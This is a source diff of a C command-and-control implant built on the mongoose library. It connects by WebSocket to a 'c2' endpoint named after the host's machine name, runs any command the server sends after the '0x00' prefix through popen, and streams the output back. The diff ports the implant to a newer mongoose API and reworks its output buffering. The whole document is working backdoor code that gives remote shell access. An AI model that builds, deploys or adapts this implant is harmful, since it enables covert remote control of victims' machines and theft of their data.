@@ -4,30 +4,36 @@
 
 #include "mongoose/mongoose.h"
 
-static int closed = 0;
-char results[4096];
+char global_output[4096];
 
 const char *
 get_machine_name()
 {
    static struct utsname u;
    if (uname(&u) < 0) {
-      assert(0);
       return "unknown";
    }
    return u.nodename;
 }
 
-void
+char *
 run_command(const char *command)
 {
-    printf("Running... %s\n", command);
-    char buffer[1024];
-    FILE *fp = popen(command, "r");
-    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
-        strcat(results, buffer);
+    char buffer[2048];
+    char *output = NULL;
+    size_t output_size = 0;
+    FILE *pipe = popen(command, "r");
+
+    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
+        size_t len = strlen(buffer);
+        char *new_output = realloc(output, output_size + len + 1);
+        output = new_output;
+        memcpy(output + output_size, buffer, len + 1);
+        output_size += len;
     }
-    pclose(fp);
+
+    pclose(pipe);
+    return output;
 }
 
 bool
@@ -39,11 +45,13 @@ prefix(const char *pre, const char *str)
 int
 tasking(int data_size, const char *data)
 {
-    //printf("%.*s\n", data_size, data);
+    printf("%.*s\n", data_size, data);
 
     if (prefix("0x00", data) == true) {
         data += 5;
-        run_command(data);
+        char *o = run_command(data);
+        memcpy(global_output, o, strlen(o));
+        //printf("%s\n", global_output);
     } else if (prefix("0x01", data) == true) {
         printf("Do something else here...\n");
     }
@@ -52,37 +60,23 @@ tasking(int data_size, const char *data)
 }
 
 static void
-event_handler(struct mg_connection *conn, int event, void *event_data)
+event_handler(struct mg_connection *conn, int event, void *event_data, void *fn_data)
 {
-    (void) conn;
-
     switch (event) {
-        case MG_EV_WEBSOCKET_HANDSHAKE_DONE: {
-            struct http_message *hm = (struct http_message *) event_data;
-            if (hm->resp_code == 101) {
-                printf("[+] Connected\n");
-            } else {
-                printf("[-] Connection failed! HTTP code %d\n", hm->resp_code);
-            }
-            break;
-        }
         case MG_EV_POLL: {
-            int n = strlen(results);
+            int n = strlen(global_output);
             if (n != 0) {
-                mg_send_websocket_frame(conn, WEBSOCKET_OP_TEXT, results, n);
+                mg_ws_send(conn, global_output, n, WEBSOCKET_OP_TEXT);
             }
-            //memset(results, 0, 4096);
-            //results[0] = '\0';
+            //memset(global_output, 0, 4096);
+            //global_output[0] = '\0';
             break;
         }
-        case MG_EV_WEBSOCKET_FRAME: {
-            struct websocket_message *wm = (struct websocket_message *) event_data;
-            tasking(wm->size, (char *) wm->data);
-            break;
-        }
-        case MG_EV_CLOSE: {
-            closed = 1;
-            printf("[-] Disconnected\n");
+        case MG_EV_WS_MSG: {
+            struct mg_ws_message *wm = (struct mg_ws_message *) event_data;
+            if (wm->data.len != 0) {
+                tasking(wm->data.len, (char *) wm->data.ptr);
+            }
             break;
         }
     }
@@ -93,21 +87,20 @@ main()
 {
     struct mg_mgr mgr;
     struct mg_connection *conn;
+    bool done = false;
 
     char url[128];
     snprintf(url, 128, "ws://127.0.0.1:1337/c2/%s", get_machine_name());
 
-    mg_mgr_init(&mgr, NULL);
+    mg_mgr_init(&mgr);
 
-    conn = mg_connect_ws(&mgr, event_handler, url, NULL, NULL);
+    conn = mg_ws_connect(&mgr, url, event_handler, &done, NULL);
     if (conn == NULL) {
         fprintf(stderr, "Invalid address\n");
         return 1;
     }
 
-    while (!closed) {
-        mg_mgr_poll(&mgr, 100);
-    }
+    while (conn && done == false) mg_mgr_poll(&mgr, 100);
     mg_mgr_free(&mgr);
 
     return 0;
